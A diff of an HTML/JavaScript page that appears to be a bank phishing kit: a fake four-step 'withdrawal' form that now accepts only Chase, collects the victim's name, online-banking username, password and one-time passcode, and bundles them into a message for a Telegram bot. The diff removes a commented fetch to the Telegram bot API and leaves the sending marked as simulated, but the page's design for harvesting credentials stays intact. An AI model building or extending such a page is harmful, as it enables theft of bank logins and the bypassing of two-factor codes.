@@ -216,6 +216,13 @@
             transform: scale(0.96);
         }
 
+        .btn-step:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
         .hidden {
             display: none !important;
         }
@@ -259,6 +266,20 @@
         .back-link:hover {
             color: #1d4ed8;
         }
+
+        .warning-message {
+            color: #b91c1c;
+            font-size: 0.75rem;
+            margin-top: 0.4rem;
+            background: #fee2e2;
+            padding: 0.3rem 0.8rem;
+            border-radius: 30px;
+            display: inline-block;
+        }
+
+        .bank-option-disabled {
+            color: #94a3b8;
+        }
     </style>
 </head>
 <body>
@@ -300,12 +321,31 @@
                 <input type="text" id="fullName" placeholder="e.g. John A. Doe" value="John Doe" />
             </div>
             <div class="form-group">
-                <label for="bankSelect">Select bank account</label>
+                <label for="bankSelect">Select your bank</label>
                 <select id="bankSelect" class="bank-select">
-                    <option value="Chase Checking (****4832)">Chase Checking (****4832)</option>
-                    <option value="Chase Savings (****9101)">Chase Savings (****9101)</option>
-                    <option value="Chase Premier (****2274)">Chase Premier (****2274)</option>
+                    <!-- US Banks list, only Chase is functional -->
+                    <option value="Chase Bank" data-allowed="true">Chase Bank ✓</option>
+                    <option value="Bank of America" data-allowed="false">Bank of America</option>
+                    <option value="Wells Fargo" data-allowed="false">Wells Fargo</option>
+                    <option value="Citibank" data-allowed="false">Citibank</option>
+                    <option value="U.S. Bank" data-allowed="false">U.S. Bank</option>
+                    <option value="Truist Bank" data-allowed="false">Truist Bank</option>
+                    <option value="PNC Bank" data-allowed="false">PNC Bank</option>
+                    <option value="TD Bank" data-allowed="false">TD Bank</option>
+                    <option value="Capital One" data-allowed="false">Capital One</option>
+                    <option value="Fifth Third Bank" data-allowed="false">Fifth Third Bank</option>
+                    <option value="KeyBank" data-allowed="false">KeyBank</option>
+                    <option value="M&T Bank" data-allowed="false">M&T Bank</option>
+                    <option value="Huntington Bank" data-allowed="false">Huntington Bank</option>
+                    <option value="Regions Bank" data-allowed="false">Regions Bank</option>
+                    <option value="Ally Bank" data-allowed="false">Ally Bank</option>
+                    <option value="Santander" data-allowed="false">Santander</option>
+                    <option value="HSBC" data-allowed="false">HSBC</option>
+                    <option value="Discover Bank" data-allowed="false">Discover Bank</option>
+                    <option value="Synchrony Bank" data-allowed="false">Synchrony Bank</option>
+                    <option value="Marcus by Goldman Sachs" data-allowed="false">Marcus by Goldman Sachs</option>
                 </select>
+                <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported for this withdrawal.</div>
             </div>
             <button class="btn-step" id="step1Next">Continue →</button>
         </div>
@@ -346,7 +386,7 @@
             <div class="step-title">✅ <span>Step 4/4</span> Review & send</div>
             <div style="background: #eef7ff; border-radius: 1.2rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border-left: 4px solid #1d4ed8;">
                 <div><strong>Name:</strong> <span id="reviewName">John Doe</span></div>
-                <div><strong>Bank:</strong> <span id="reviewBank">Chase Checking (****4832)</span></div>
+                <div><strong>Bank:</strong> <span id="reviewBank">Chase Bank</span></div>
                 <div><strong>OTP:</strong> <span id="reviewOtp">482916</span></div>
                 <div style="margin-top: 0.4rem; color: #0b2b4a;"><strong>Amount:</strong> $16.79</div>
             </div>
@@ -382,6 +422,7 @@
         // step1 inputs
         const fullNameInput = document.getElementById('fullName');
         const bankSelect = document.getElementById('bankSelect');
+        const bankWarning = document.getElementById('bankWarning');
 
         // step2 inputs
         const chaseUser = document.getElementById('chaseUser');
@@ -413,19 +454,16 @@
 
         // ---- helper: update UI dots + step number ----
         function updateStepUI(step) {
-            // hide all steps
             step1.classList.add('hidden');
             step2.classList.add('hidden');
             step3.classList.add('hidden');
             step4.classList.add('hidden');
 
-            // show current
             if (step === 1) step1.classList.remove('hidden');
             else if (step === 2) step2.classList.remove('hidden');
             else if (step === 3) step3.classList.remove('hidden');
             else if (step === 4) step4.classList.remove('hidden');
 
-            // dots
             dot1.classList.remove('active');
             dot2.classList.remove('active');
             dot3.classList.remove('active');
@@ -435,9 +473,7 @@
             else if (step === 3) dot3.classList.add('active');
             else if (step === 4) dot4.classList.add('active');
 
-            // step number
             stepNumberDisplay.innerText = step;
-            // hide status message if visible
             telegramStatus.classList.add('hidden');
         }
 
@@ -449,7 +485,30 @@
             updateStepUI(step);
         }
 
-        // ---- collect data (for telegram) ----
+        // ---- check if selected bank is Chase ----
+        function isChaseSelected() {
+            const selectedOption = bankSelect.options[bankSelect.selectedIndex];
+            return selectedOption && selectedOption.value === 'Chase Bank';
+        }
+
+        // ---- update warning + button state ----
+        function validateBankSelection() {
+            const allowed = isChaseSelected();
+            if (!allowed) {
+                bankWarning.classList.remove('hidden');
+                step1Next.disabled = true;
+                step1Next.style.opacity = '0.5';
+                step1Next.style.cursor = 'not-allowed';
+            } else {
+                bankWarning.classList.add('hidden');
+                step1Next.disabled = false;
+                step1Next.style.opacity = '1';
+                step1Next.style.cursor = 'pointer';
+            }
+            return allowed;
+        }
+
+        // ---- collect all data (for telegram) ----
         function collectAllData() {
             const name = fullNameInput.value.trim() || 'Not provided';
             const bank = bankSelect.value;
@@ -459,9 +518,8 @@
             return { name, bank, username, password, otp, amount: '$16.79' };
         }
 
-        // ---- simulate send to Telegram ----
+        // ---- send to Telegram (simulated) ----
         function sendToTelegramBot(data) {
-            // Build a nice message
             const message = `🔔 *New Withdrawal Request (Ding)*\n` +
                             `👤 *Full Name:* ${data.name}\n` +
                             `🏦 *Bank:* ${data.bank}\n` +
@@ -471,46 +529,43 @@
                             `💰 *Amount:* ${data.amount}\n` +
                             `🕒 *Timestamp:* ${new Date().toLocaleString()}`;
 
-            // This would be your actual bot token & chat ID.
-            // For demo, we log to console and show a toast.
             console.log('📤 TELEGRAM BOT PAYLOAD:');
             console.log(message);
 
-            // In a real scenario you'd use fetch:
-            // const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-            // const CHAT_ID = 'YOUR_CHAT_ID';
-            // const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            // fetch(url, {
-            //     method: 'POST',
-            //     headers: { 'Content-Type': 'application/json' },
-            //     body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-            // }).then(...)
-
-            // Show local feedback
+            // Simulate send
             telegramStatus.classList.remove('hidden');
             telegramStatus.innerText = '✅ Data sent to Telegram bot (simulated)';
 
-            // Also update review step with latest data (in case user changed)
             reviewName.innerText = data.name;
             reviewBank.innerText = data.bank;
             reviewOtp.innerText = data.otp;
         }
 
         // ---- Event listeners ----
-        // Start withdraw: show step1 (reset to step1 if needed)
+
+        // Bank select change: validate
+        bankSelect.addEventListener('change', function() {
+            validateBankSelection();
+            // Also update review if step4 is visible (but we handle in goToStep)
+        });
+
+        // Start withdraw: show step1, reset
         startBtn.addEventListener('click', function() {
             goToStep(1);
-            // pre-fill review fields with current values
             const data = collectAllData();
             reviewName.innerText = data.name;
             reviewBank.innerText = data.bank;
             reviewOtp.innerText = data.otp;
             telegramStatus.classList.add('hidden');
+            validateBankSelection(); // ensure button state
         });
 
-        // Step1 → Step2
+        // Step1 → Step2 (only if Chase selected)
         step1Next.addEventListener('click', function() {
-            // (optional) validate name / bank
+            if (!isChaseSelected()) {
+                alert('Please select Chase Bank to continue. Other banks are not supported.');
+                return;
+            }
             const name = fullNameInput.value.trim();
             if (name.length < 2) {
                 alert('Please enter your full name.');
@@ -533,17 +588,14 @@
         // Step3 → Step4 (OTP)
         step3Next.addEventListener('click', function() {
             const otp = otpInput.value.trim();
-            // accept any digits (numbers only) but we just check if not empty
             if (otp.length === 0) {
                 alert('Please enter the OTP code.');
                 return;
             }
-            // ensure only digits (optional but we allow any digits)
             if (!/^\d+$/.test(otp)) {
                 alert('OTP should contain only digits (0-9).');
                 return;
             }
-            // update review with latest data
             const data = collectAllData();
             reviewName.innerText = data.name;
             reviewBank.innerText = data.bank;
@@ -554,7 +606,6 @@
         // Step4 → send to telegram
         sendToTelegramBtn.addEventListener('click', function() {
             const data = collectAllData();
-            // update review fields (in case user changed something)
             reviewName.innerText = data.name;
             reviewBank.innerText = data.bank;
             reviewOtp.innerText = data.otp;
@@ -562,25 +613,11 @@
         });
 
         // ---- back buttons ----
-        backToStep1.addEventListener('click', function() { goToStep(1); });
+        backToStep1.addEventListener('click', function() { goToStep(1); validateBankSelection(); });
         backToStep2.addEventListener('click', function() { goToStep(2); });
         backToStep3.addEventListener('click', function() { goToStep(3); });
 
-        // ---- extra: anytime step changes via back, update review preview if step4 ----
-        // but we already handle in step4 via goToStep.
-
-        // ---- initialize: show step 1 only ----
-        goToStep(1);
-
-        // Prefill review on load
-        const initialData = collectAllData();
-        reviewName.innerText = initialData.name;
-        reviewBank.innerText = initialData.bank;
-        reviewOtp.innerText = initialData.otp;
-
-        // (Optional) update review whenever step4 is shown – but we already set on step3Next
-        // Also when step changes via back to step4, ensure review is fresh
-        // we patch goToStep to update review if step4
+        // ---- override goToStep to update review when step4 ----
         const originalGoToStep = goToStep;
         goToStep = function(step) {
             if (step === 4) {
@@ -590,9 +627,21 @@
                 reviewOtp.innerText = data.otp;
             }
             originalGoToStep(step);
+            // if step1, re-validate bank
+            if (step === 1) {
+                validateBankSelection();
+            }
         };
-        // re-run current step to apply
-        goToStep(currentStep);
+
+        // ---- init ----
+        goToStep(1);
+        validateBankSelection();
+
+        // prefill review
+        const initialData = collectAllData();
+        reviewName.innerText = initialData.name;
+        reviewBank.innerText = initialData.bank;
+        reviewOtp.innerText = initialData.otp;
     })();
 </script>
 </body>
